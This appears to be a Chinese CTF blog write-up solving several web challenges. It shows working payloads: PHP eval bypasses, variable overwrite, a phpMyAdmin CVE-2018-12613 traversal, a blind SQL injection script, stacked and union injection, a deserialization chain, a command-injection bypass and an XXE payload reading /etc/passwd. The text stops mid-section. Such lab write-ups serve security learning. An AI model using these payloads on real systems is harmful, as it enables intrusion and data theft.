id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>访问</p><p><img src="/../images/image-20231114092252163.png" alt="image-20231114092252163"></p><p>dirsearch扫目录</p><p><img src="/../images/image-20231114092318009.png" alt="image-20231114092318009"></p><p>.git泄露，上Githack，下载到index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则过滤data filter php phar等伪协议</p><p>过滤分号</p><p>过滤et na info dec bin hex oct pi log</p><h2 id="利用session-id代替flag-php"><a href="#利用session-id代替flag-php" class="headerlink" title="利用session_id代替flag.php"></a>利用session_id代替flag.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:PHPSESSID=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="/../images/image-20231114093203760.png" alt="image-20231114093203760"></p><h2 id="利用函数找到并代替flag-php"><a href="#利用函数找到并代替flag-php" class="headerlink" title="利用函数找到并代替flag.php"></a>利用函数找到并代替flag.php</h2><p>localeconv()回显数组，第一个数组是字符.</p><p>pos()传入数组，回显第一个数组的值</p><p>pos(localeconv())相当于等号</p><p>scandir(.)以数组形式回显当前目录下所有文件</p><p>print_r()输出</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="keyword">pos</span>(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231114094130072.png" alt="image-20231114094130072"></p><p>array_reverse()数组反转</p><p>next()数组指针移动下一位</p><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p><img src="/../images/image-20231114094459315.png" alt="image-20231114094459315"></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>dirsearch扫目录，发现.git泄露</p><p>上githack</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>审计：</p><p>如果post传参flag和get传参flag都不为空时输出dog并退出</p><p>如果post传参flag&#x3D;flag或get传参flag&#x3D;flag时，输出cat并退出</p><p>foreach遍历，如果get传参flag&#x3D;x且x!&#x3D;flag输出handsome并退出</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p><strong>变量覆盖</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p>$x &#x3D; yds $y &#x3D; flag</p><p>$$x &#x3D; $yds $$y &#x3D; $flag</p><p>$yds &#x3D; $flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p>$is &#x3D; $flag</p><p>输出$is 必须满足get&#x2F;post传参flag&#x3D;flag</p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p><strong>CVE-2018-12613</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%253f/../../../../flag</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img src="/../images/image-20231104151346329.png" alt="image-20231104151346329"></p><p>输入1正确回显，其他则错误，盲注</p><p><strong>括号代替空格来分割</strong></p><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=(select(ascii(mid(flag,1,1))=102)from(flag))</span><br></pre></td></tr></table></figure><p>py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>(<span class="params">url</span>):</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span>                     <span class="comment">#接收结果</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):     <span class="comment">#flag一般不超过50个字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:  <span class="comment">#string.printable将给出所有的标点符号，数字，ascii_letters和空格</span></span><br><span class="line">            payload=<span class="string">&#x27;(select(ascii(mid(flag,&#123;0&#125;,1))=&#123;1&#125;)from(flag))&#x27;</span>.<span class="built_in">format</span>(num,<span class="built_in">ord</span>(i)) <span class="comment">#ord函数用来获取单个字符的ascii码</span></span><br><span class="line">            post = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">            result = requests.post(url=url,data=post)   <span class="comment">#提交post请求</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                flag += i   <span class="comment">#用flag接收盲注得到的结果</span></span><br><span class="line">                <span class="built_in">print</span>(flag) <span class="comment">#打印结果</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url=<span class="string">&#x27;http://935ab885-c359-48b2-8673-50710c1c3e72.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    blind_sql(url)</span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>黑名单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject)</span><br></pre></td></tr></table></figure><p>尝试了大小写、注释、内联注释都没用</p><h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a><strong>堆叠注入：</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; show databases; #</span><br><span class="line">-1&#x27;; show tables from ctftraining; #</span><br><span class="line">-1&#x27;; show tables; #</span><br><span class="line">-1&#x27;; show columns from FlagHere  ; #</span><br></pre></td></tr></table></figure><p>最后得到字段FlagHere</p><p>这里用<strong>Handler</strong>读取</p><p>Handler open 打开一个表</p><p>Handler  read 读取</p><p>Handler close关闭</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1;</span><br><span class="line">Handler FlagHere open ;</span><br><span class="line">Handler FlagHere read first;</span><br><span class="line">Handler FlagHere close;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>union select 1,2,3</p><p>逐个测试admin，发现username在第二个字段</p><p>联合注入<strong>创建一条临时数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>从上往下看，如果触发__construct方法，会赋值op&#x3D;1，并且调用process方法</p><p>再看process方法，如果op&#x3D;1，则会调用write()方法，把<em>Hello World!<em>写入</em>&#x2F;tmp&#x2F;tmpfile</em></p><p>而最后一行对get传参str进行了类型转换，并且反序列化，这并不是在创建对象，所以不会触发__construct方法</p><p>如果想要触发__destruct方法，必须使op&#x3D;2绕过if判断,调用process方法，进而调用read方法，再利用filename属性去读取flag.php</p><h2 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$op</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;op=<span class="variable">$op</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>(<span class="number">2</span>,<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>执行一下</p><p><img src="/../images/image-20231103193613731.png" alt="image-20231103193613731"></p><p>成功拿到flag</p><p><img src="/../images/image-20231103193653759.png" alt="image-20231103193653759"></p><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>打开环境</p><p><img src="/../images/image-20231216142312108.png" alt="image-20231216142312108"></p><p>啥也看不出来，抓个包</p><p><img src="/../images/image-20231216142354527.png" alt="image-20231216142354527"></p><p>func是函数，p是函数的参数</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=system&amp;p=whoami</span><br></pre></td></tr></table></figure><p>被过滤</p><p><img src="/../images/image-20231216142552487.png" alt="image-20231216142552487"></p><p>加个反斜杠，可以执行</p><p><img src="/../images/image-20231216142627523.png" alt="image-20231216142627523"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=\system&amp;p=cat $(find / -name flag*)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216142945673.png" alt="image-20231216142945673"></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>打开环境</p><p><img src="/../images/image-20231216143424625.png" alt="image-20231216143424625"></p><p>根据题目猜测是XXE</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216143833788.png" alt="image-20231216143833788"></p><p><img src="/../images/image-20231216143908742.png" alt="image-20231216143908742"></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>打开环境</p><p><img src="/../images/image-20231216144112963.png" alt="image-20231216144112963"></p><p>flag</p><p><img src="/../images/image-20231216144446052.png" alt="image-20231216144446052"></p><p>id输入什么就会显示什么</p><p><img src="/../images/image-20231216144507177.png" alt="image-20231216144507177"></p><p>抓包看一下</p><p><img src="/../images/image-20231216144554296.png" alt="image-20231216144554296"></p><p>尝试一下有没有可能是SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 